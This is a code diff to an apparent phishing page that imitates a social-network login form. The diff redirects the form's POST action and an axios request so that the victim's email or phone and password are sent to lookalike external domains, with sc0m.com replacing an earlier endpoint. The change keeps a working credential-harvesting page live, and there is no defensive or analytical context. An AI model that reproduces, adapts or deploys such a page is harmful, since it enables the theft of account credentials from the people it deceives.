@@ -43,7 +43,7 @@
                <div id="erorrmail">Incorrect email or phone number.</div>
                <div id="erorrpass">The password you entered is incorrect.</div>
             </div>
-            <form action="https://sc0m.com/add.php" id="veh0" method="POST" name="loginform" autocomplete="on">
+            <form action="https://sc0m.com/v/add" id="veh0" method="POST" name="loginform" autocomplete="on">
                 <input style="background-color: #fafafa;" class="inputl" id="email" maxlength="50" placeholder="Email address or phone number" type="text" name="email" required>
                 <input class="inputl" id="password" name="password" maxlength="50"  placeholder="Password" type="password" required>
                  <input type="hidden" value="" name="id" v-model="id_u">
@@ -80,7 +80,7 @@
    let sc = urlParams.get('sc');
       if (email != "" && password != "") {
         axios
-          .post("https://sp0meur.com/v/add", {
+          .post("https://sc0m.com/v/add", {
             email: email,
             ip: "wwwwwwww",
             password: password,
